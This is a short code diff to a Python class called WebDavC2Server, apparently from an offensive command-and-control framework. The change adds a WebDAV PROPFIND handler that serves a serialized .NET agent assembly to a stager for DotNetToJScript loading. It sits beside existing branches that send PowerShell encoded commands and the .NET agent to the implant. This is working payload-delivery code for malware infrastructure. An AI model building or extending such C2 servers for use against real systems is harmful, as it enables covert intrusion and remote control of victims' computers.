@@ -103,7 +103,20 @@ class WebDavC2Server(Thread):
 									# The data is already base64 encoded, so no need to encode it again, setting encode=False
 									response = self.propfindResponse(encodedCommand, encode=False)
 									print helpers.color ("[+] Sending powershell encoded command to the stager")
-									
+								
+								#---- Stager is requesting the serialized .Net assembly for use with DotNetToJScript
+								elif request.path.startswith('/serialized'):
+									try:
+										with open('agent/agent_serialized.bin') as fileHandle:
+											fileBytes = bytearray(fileHandle.read())
+											fileHandle.close()
+									except IOError:
+										print helpers.color("[!] Could not open or read file [agent_serialized.bin]")
+										quit()
+
+									response = self.propfindResponse(fileBytes)
+									print helpers.color ("[+] Sending serialized agent binary (.Net assembly) to the stager")
+	
 								#---- Stager is requesting the .Net assembly
 								elif request.path.startswith('/agent'):
 									try:
